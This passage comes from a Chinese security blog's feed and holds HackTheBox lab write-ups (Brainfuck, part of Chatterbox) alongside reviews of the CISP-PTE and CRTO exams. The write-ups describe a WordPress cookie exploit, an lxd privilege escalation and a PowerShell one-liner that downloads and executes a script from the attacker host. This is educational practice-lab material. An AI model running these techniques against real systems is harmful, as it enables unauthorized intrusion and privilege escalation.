                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bounty/image.teemhvorkqo.webp"
                     
                ></p>
<p>很奇怪的是，并没有在这台靶机上找到user.txt</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bounty/image.279zulcp3gcg.webp"
                     
                ></p>
<p>重置靶机后还是找不到</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bounty/image.qya44n2x5fk.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Brainfuck - HackTheBox</title>
    <url>/post/f19b5ee3dc23/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.zq5ix64new0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.4rwa5zqoku80.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.113abziuveio.webp"
                     
                ></p>
<p>直接访问IP只有一个nginx的默认页</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.80ikzqpqgdw.webp"
                     
                ></p>
<p>443端口扫描结果中有三个域名地址</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.68j0wpcl7rg0.webp"
                     
                ></p>
<p>添加hosts解析</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.657l6ka0jdc0.webp"
                     
                ></p>
<p>brainfuck.htb与<a href="www.brainfuck.htb">www.brainfuck.htb</a>解析相同，sup3rs3cr3t.brainfuck.htb打开暂无发现可利用信息，有登录点，没有账号密码无法登录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.3l8fvcysuby0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.3jpp0k87sfs0.webp"
                     
                ></p>
<p>在访问时，发现brainfuck.htb为wordpress搭建，利用wpscan扫描一波，先去wpscan注册账号获取key</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.13f9yrfczqw0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.1gydm7orgrsw.webp"
                     
                ></p>
<p>扫描结果</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.7d25vnj0t700.webp"
                     
                ></p>
<p>利用其中获取cookie的漏洞尝试获取cookie登录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.61zhz51tbr00.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.74y4abmrbk80.webp"
                     
                ></p>
<p>exp需要用户名，邮箱信息</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.4vkbm4p0nqg0.webp"
                     
                ></p>
<p>用户名从brainfuck.htb主页发现一个admin发表的文章，猜测用户名有一个为admin，或者在登录界面进行猜解，该wordpress版本在用户名不存在以及密码不正确的情况下，提示信息会不同，可以此判断用户名是否存在</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.31uq3iczu8e0.webp"
                     
                ></p>
<p>邮箱可通过查看浏览器中的证书得到</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.3840dp97qxi0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.4txxlsawq7s0.webp"
                     
                ></p>
<p>新建一个文本，存储用户名，邮箱等信息</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.1gomovysbh0g.webp"
                     
                ></p>
<p>用curl进行利用，-X为以post方式提交，-d将文本内的内容作为参数传递，-k忽略https证书问题</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.2vuw3tdlh5u0.webp"
                     
                ></p>
<p>获得cookie，第一条第二条相同</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.2g0700ykbxwk.webp"
                     
                ></p>
<p>之后利用burp进行添加第一条以及第三条cookie访问</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.ovjomr9xn5c.webp"
                     
                ></p>
<p>当cookie添加后，浏览器开启代理指向burp，当访问站点的时候，数据包中就会添加cookie值</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.4lghxl15ejy0.webp"
                     
                ></p>
<p>成功登录</p>
<p>或者可以将exp填写完后，在本地开启http服务，将exp改为html文件，进行登录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.3dmii5efzjg0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.4lr17s8uts40.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.2v6dh363dt40.webp"
                     
                ></p>
<p>登陆后一片空白，返回brainfuck.htb查看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.44n1jp025y40.webp"
                     
                ></p>
<p>同样成功登录</p>
<p>进入后台</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.1wa9om7v6icg.webp"
                     
                ></p>
<p>后台翻半天没找着可利用点</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.1gwzzokpznnk.webp"
                     
                ></p>
<p>返回端口扫描结果查看，找到一个SMTP的账号密码，在之前端口扫描时，发现110端口开放了SMTP服务</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.16xeqc6og7k0.webp"
                     
                ></p>
<p>密码为密文，修改前端代码进行查看，将type类型从passwd修改为text文本类型即可查看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.5i6mbg7lyw80.webp"
                     
                ></p>
<p>利用该账号密码连接SMTP</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.6k0h4d1rlgo0.webp"
                     
                ></p>
<p>发现有两封邮件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.3y2mpn9u09m0.webp"
                     
                ></p>
<p>第一封为创建站点时的默认信息</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.2yqdl8q1ci80.webp"
                     
                ></p>
<p>第二封发现一个账号密码，猜测为sup3站点的登录账号密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.2l31il6t63s0.webp"
                     
                ></p>
<p>成功登录</p>
<p>发现三封帖子</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.4e8gdaivfaq0.webp"
                     
                ></p>
<p>第三封无利用信息</p>
<p>第二封大意为用户找管理要索要密钥，且重新开了一个加密帖子</p>
<p>那么第一封应该就是加密的密钥了</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.4qm3p7hguu80.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.5cgtvwrbzsc0.webp"
                     
                ></p>
<p>最后一条信息很像一个url地址，但是为加密状态，利用解密站点尝试解密</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.65zuig2reds0.webp"
                     
                ></p>
<p>先尝试第一条信息</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.1a31bizyi3b4.webp"
                     
                ></p>
<p>猜测加密的密钥可能为索要密钥帖子的最后一条</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.gb24jgals5c.webp"
                     
                ></p>
<p>尝试解密</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.ydbcomkc3sw.webp"
                     
                ></p>
<p>将所有符号与空格删除</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.5rjyh2xn0bs0.webp"
                     
                ></p>
<p>内容为重复fuckmybrain，利用改密钥去尝试解密url加密</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.3scn6vy4fbc0.webp"
                     
                ></p>
<p>得到一个密钥下载地址</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.q8z4ix5fb9s.webp"
                     
                ></p>
<p>无法直接利用，尝试爆破</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.6cjdg0djbd80.webp"
                     
                ></p>
<p>爆破出密钥为<strong>3poulakia!</strong></p>
<p>ssh进行连接</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.6atxjry7cd80.webp"
                     
                ></p>
<p>获取user flag</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.t6tokqsnnxc.webp"
                     
                ></p>
<p>尝试提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.3r31zrb7hrm0.webp"
                     
                ></p>
<p>发现该用户存在lxd组内，lxd为一种容器管理程序，可将磁盘挂载至容器内，从而达到提权</p>
<p>在exploit-db中找到一个可利用exp</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.7ipe5cmnvt00.webp"
                     
                ></p>
<p>查看两个二进制文件是否存在</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.4x41x0srv720.webp"
                     
                ></p>
<p>返回攻击机，下载build-alpine，下载不下来可访问该地址，将其全部复制在写入一个文本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.29cxdb2jszpc.webp"
                     
                ></p>
<p>在运行该程序</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.125l80uq5bq8.webp"
                     
                ></p>
<p>得到一个压缩文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.5jnw03wfygg0.webp"
                     
                ></p>
<p>在攻击机开启一个http服务</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.5tho4i16umo0.webp"
                     
                ></p>
<p>让目标机器下载压缩文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.27lm4hulhrk0.webp"
                     
                ></p>
<p>在运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lxc image import alpine-v3.17-x86_64-20230408_1114.tar.gz --alias test</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.4uwzipq4c1s0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.6lyabe319wk0.webp"
                     
                ></p>
<p>继续利用，初始化镜像</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.4vincrru0rg0.webp"
                     
                ></p>
<p>挂载磁盘</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.2smi9kc8wyo0.webp"
                     
                ></p>
<p>启动镜像</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.1d6p0j2wf42o.webp"
                     
                ></p>
<p>以shell会话进入镜像</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.vf65szrq5j4.webp"
                     
                ></p>
<p>成功获取root</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.2mgo1p84a5y0.webp"
                     
                ></p>
<p>在挂载的磁盘中寻找root flag</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Brainfuck/image.1pkjfnwxgwkg.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>CISP-PTE</title>
    <url>/post/3db9351ab62a/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一直想着需不需要考个证书，毕竟看着大佬们那些堆起来的证书都感觉特别强。</p>
<p>评估了一下自己的水平和钱包的厚度，看来看去，看到了国内的CISP认证系列。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.1266hocqf09s.webp"
                     
                ></p>
<p>看看这可怕的时间要求，我只是一个刚毕业的小牛马，还够不着他的最低要求。</p>
<p>后续我又了解到CISP的其他分支系列。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.79inhjjdjrk0.webp"
                     
                ></p>
<p>太多了，我一直学的是渗透，所以选择了CISP-PTE，没有选CISP-PTS的原因是，当时我在报名的时候，某机构报价是CISP-PTE学生6k，非学生8k，而CISP-PTS，起步则是一个w，我看了一眼钱包，它并不是很支持我去考虑CISP-PTS。</p>
<h1 id="备考"><a href="#备考" class="headerlink" title="备考"></a>备考</h1><p>在报名之后，机构会开展一个几天的所谓的培训，如果事先有学习过，可以不用听，直接去做题就行了。</p>
<p>题目大同小异，无非就是那些web漏洞罢了，主要是避免一些出题角度很偏的题目，如果没有事先练习过，可能在考试的时候会浪费很多时间。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.3u5q8nwp4q20.webp"
                     
                ></p>
<p>这张图我觉得有点夸大其实了，CISP-PTE这个证书顶多算是一个入门级的认证，并不会有这么多的一个知识体系，而且其中涉及到的也只是轻描淡写的掠过，并不是很深入。</p>
<p>之后便是做练习题，做练习题，做练习题…</p>
<h1 id="考试过程"><a href="#考试过程" class="headerlink" title="考试过程"></a>考试过程</h1><p>因为当时疫情比较严重，本来是需要去线下考点进行考试的，改为了线上考试。</p>
<p>考试要求两个手机进行画面拍摄，一个用于拍摄电脑画面，一个用于拍摄操作人画面，进入腾讯会议开启视频和语音，中途不允许退出。</p>
<p>在考试前一天晚上，机构的人会来确认拍摄画面的正常与否，如果没有问题，那么第二天按照这个操作来即可。</p>
<p>考试在上午10点，在进入会议室开启摄像头拍摄画面后，即可开始考试，考试是在一个虚拟环境中进行，会让你连接一个类似于浏览器的东西，这个连接以后不能切换后台，否则直接帮你交卷，过程中可以申请去厕所，限时五分钟，超时按作弊处理。</p>
<p>题目比较简单，唯一难受的就是在虚拟化平台中操作，会很卡，并且拿到的flag，无法复制提交，只能手打，并且提交时也不会验证是否正确，所以要一个一个的确认，开考半小时就把题目做完，还剩20道选择题，一题一分，满分100，70分算通过，所以我即使选择题不做，我也足以通过考试，但抱着能多点分就多一点的想法，就随便选完了。</p>
<p>提交所有答案之后，我提前交卷完成考试，最终得分91分。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/eaf3467738c2cc656d2b1cbcaa15268.56etwt1wor00.webp"
                     
                ></p>
<p>稳稳的通过了考试，当然，这个只是算一个参考，如果后续在手机拍摄到的画面中，发现有作弊或者其他违规行为，那么考试成绩也会将被取消。</p>
<p>最终证书需要等三个月的时间。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.6hidpsykj900.webp"
                     
                ></p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>不得不说，这个证真的只是入门级的，从我考试开始到结束，我只用去了25分钟，但考都考了，多一个总比少一个好。</p>
]]></content>
  </entry>
  <entry>
    <title>CRTO</title>
    <url>/post/871cf5124189/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Certified Red Team Operator（CRTO）是一种专业证书，证明了个人在红队运作领域的专业知识和能力。红队运作是指在组织的信息系统和网络上进行模拟网络攻击，由一组安全专家进行，旨在识别组织的安全弱点和漏洞。</p>
<p>CRTO证书通常由安全培训和认证机构提供，面向参与红队运作的个人，如渗透测试人员，安全顾问和事件响应人员。获得证书的过程通常包括一次考试，测试个人对红队运作方法，工具和技术的知识，以及在实际场景中应用这些知识的能力。</p>
<p>持有 CRTO证书表明个人对红队运作有深刻的理解和能力，能够对组织的系统和网络进行有效的模拟攻击，这是网络安全领域中任何专业人员都应该具备的技能。</p>
<h1 id="收费标准"><a href="#收费标准" class="headerlink" title="收费标准"></a><strong>收费标准</strong></h1><ul>
<li>课程材料（永久更新），365英镑，购买课程后赠送一次考试机会</li>
<li>单独考试尝试或者重考费用，99英镑</li>
<li>Lab分为30天、180天、365天</li>
<li><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.2hj8hstslto0.webp"
                     
                ></li>
</ul>
<h1 id="课程框架"><a href="#课程框架" class="headerlink" title="课程框架"></a><strong>课程框架</strong></h1><p>在CRTO课程中，学员会学习到如何使用Cobalt Strike进行内网渗透。</p>
<ol>
<li>入门</li>
<li>命令与控制</li>
<li>外部侦查</li>
<li>初始入侵</li>
<li>主机侦查</li>
<li>主机持久性</li>
<li>主机特权提升</li>
<li>主机持久性（重复）</li>
<li>凭据盗取</li>
<li>密码破解技巧与技巧</li>
<li>域侦查</li>
<li>用户模仿</li>
<li>横向移动</li>
<li>会话传递</li>
<li>枢转</li>
<li>数据保护API</li>
<li>Kerberos</li>
<li>Active Directory证书服务</li>
<li>组策略</li>
<li>MS SQL服务器</li>
<li>域统治</li>
<li>森林和域信任</li>
<li>本地管理员密码解决方案</li>
<li>Microsoft Defender Antivirus</li>
<li>应用程序白名单</li>
<li>数据搜索和外泄</li>
<li>扩展Cobalt Strike</li>
</ol>
<h1 id="实验室"><a href="#实验室" class="headerlink" title="实验室"></a><strong>实验室</strong></h1><p>以前的实验室貌似是按小时计费，现在有点类似于套餐形式了，一个月三十天，总共可用120小时，随用随停，不需要连接VPN，可通过浏览器直接访问</p>
<p>合理利用的话，完完全全足够完成课程练习的</p>
<h1 id="考试模式"><a href="#考试模式" class="headerlink" title="考试模式"></a><strong>考试模式</strong></h1><p>考试机器有8台机器，需要获得6台以上机器的flag.txt才可以通过考试。考试时间为4天，考试机器48小时，也就是说平均下来每天可以访问机器12小时。其中考试没有人监考，考试开始前一小时重新安排或取消预约，并且只需提交flag即可，不需要编写过程报告，考试预约也非常方便，基本是头天可以预约第二天的考试</p>
<p>由于是通过浏览器访问，在稳定性以及响应速度上，会稍逊于VPN连接，这个没有很好的解决方法</p>
<p>最终成绩甚至不需要等到考试结束，今天总结昨天的成绩，如果符合通过条件，就算考试还没结束，也会算通过，颁发徽章以及证书</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h1><p>考试其实不难，基本都是课程里面有过练习的，灵活运用一下，基本上都是可以考过的</p>
<p>CRTO总体课程偏向于内网方向，如果有对内网不够熟练的话，可以考虑学习学习，并且还有配套的环境可供练习，还是非常不错的</p>
<p>最后放上徽章以及证书</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.68o58jddqog0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.qdb3hg7m628.webp"
                     
                ></p>
]]></content>
  </entry>
  <entry>
    <title>Chatterbox - HackTheBox</title>
    <url>/post/c089cde000c7/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.7jwiq8vcwjc0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.2kvnnvyqwcs0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.5qfe212zjj40.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.4afl8ap43d40.webp"
                     
                ></p>
<p>9255和9256端口显示为同一个服务，访问看看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.5dmvh3p55sc0.webp"
                     
                ></p>
<p>9255访问为空</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.50vjfhjwgvg0.webp"
                     
                ></p>
<p>9256也不知道是个啥，搜一下有无exp</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.2ksb564dg1i0.webp"
                     
                ></p>
<p>一个缓冲区溢出漏洞</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.130awguikay.webp"
                     
                ></p>
<p>还给了生成方法，修改一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.5exxuddt8280.webp"
                     
                ></p>
<p>修改为用powershell远程请求本地的反弹shell文件</p>
<p>exploit-db给的python脚本那就是死活没用啊，换了一个github的脚本</p>
<p><code>https://github.com/mpgn/AChat-Reverse-TCP-Exploit</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.5k6zobm7wyk0.webp"
                     
                ></p>
<p>把ip也修改一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.r9lr7cj5y4w.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.6oud2h2h8bw0.webp"
                     
                ></p>
<p>提权脚本检测了一下，基本是没有可利用的</p>
<p>利用powerup检测一下，发现当前用户的密码</p>
<p><code>powershell.exe -nop -exec bypass -c &quot;iex(new-object system.net.webclient).downloadstring(&#39;http://10.10.14.17/PowerUp.ps1&#39;)&quot;</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.qgy8vsx541s.webp"
                     
                ></p>
<p>尝试用这个密码切换一下用户</p>
<p><code>https://stackoverflow.com/questions/15895877/how-to-switch-current-user-using-powershell</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.6arrkdd4vbg0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.4u8kflh1ba80.webp"
                     
                ></p>
<p>修改一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.5ucl5u4zqg80.webp"
                     
                ></p>
<p>依次执行</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.6kq9u0gaj7k0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
